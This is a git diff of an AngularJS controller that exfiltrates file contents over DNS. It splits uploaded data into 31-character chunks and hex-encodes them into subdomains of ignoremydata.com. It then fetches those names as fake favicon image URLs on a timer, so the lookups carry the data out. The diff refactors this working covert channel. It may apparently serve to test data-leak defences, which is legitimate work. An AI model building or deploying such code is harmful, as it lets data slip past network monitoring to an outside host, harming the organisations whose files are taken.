@@ -63,7 +63,7 @@ pcApp.controller('formController', ['$scope', 'Upload', '$timeout','$interval',
         if ( myFile ) {
             $scope.fileButtonMessage = myFile.name ;
             $scope.fileSize = myFile.size / 1000000 ; // MB'ish
-            console.log('file selected',$scope.fileSize , myFile);
+            console.log('file selected, size :',$scope.fileSize , myFile);
         }
     };
 
@@ -115,14 +115,19 @@ pcApp.controller('formController', ['$scope', 'Upload', '$timeout','$interval',
         console.log( 'processFile : delay : ', $scope.formFields.delay);
 		var blocks = data.match( /[\s\S]{1,31}/g );
 
+        var path = '/icos/favico.png';
+        // var domain = '.cdn.ignoremydata.com';
+        var domain = '.ignoremydata.com';
+        var startName = 'start.' + uid + domain;
+        var stopName = 'stop.' + uid + domain;
+
         // we want a delay between each DNS query, and the 'timeout' functions,
         // are non-blocking. So the safest thing is to generate all the queries,
         // stack them into an array, then interval them
 
-        var startImg = 'http://start.' + uid + '.ignoremydata.com/favico.png';
-        var stopImg = 'http://stop.' + uid + '.ignoremydata.com/favico.png';
-
-        var queries = [ startImg ];
+        // var startImg = 'http://start.' + uid + '.ignoremydata.com/favico.png';
+        // var stopImg = 'http://stop.' + uid + '.ignoremydata.com/favico.png';
+        var queries = [ startName ];
 
         // $timeout(function(){
         //     console.log ('after timeout');
@@ -133,28 +138,37 @@ pcApp.controller('formController', ['$scope', 'Upload', '$timeout','$interval',
 		for( var block in blocks ) {
             var idx = block;
             idx ++ ; // 1 based cointing for the URL
-			var s = Hexdump.dump( blocks[block] ) +
-            '.'+ idx +'.'+ uid +'.ignoremydata.com' ;
 
-            // now use that string to generate a fake image url
+			var q = Hexdump.dump( blocks[block] ) +
+            '.'+ idx +'.'+ uid + domain ;
 
-            var iurl = "http://"+s+"/favico.jpg";
-            queries.push( iurl );
+
+            queries.push( q );
 
 		}
 
-        queries.push( stopImg );
-        console.log ( queries.length , queries );
+        queries.push( stopName );
+        console.log ( 'slices' , queries.length );
 
-        // now load the urls, at a fixed interval
+        // now load the dns queries, at a fixed interval
         qidx = 0 ;
         $interval(function(){
+
+            // now use that string to generate a fake image url
+            // var iurl = "http://"+s+"/favico.jpg";
+            // var startImg = 'http://' + startName + path ;
+            // var stopImg = 'http://' + stopName + path ;
+
             var q = queries[qidx];
+
+            var iurl = 'http://' + q + path ;
+
             // and force a query
-            dummyImg.src = q;
+            dummyImg.src = iurl;
+
             // $interval calls $digest, so no need to call 'logMessage()'
             // $scope.logMessage(q);
-            console.log ('q',q);
+            console.log ('query',q);
             $scope.logresult += q + "\n";
             qidx++;
         },$scope.formFields.delay,queries.length);
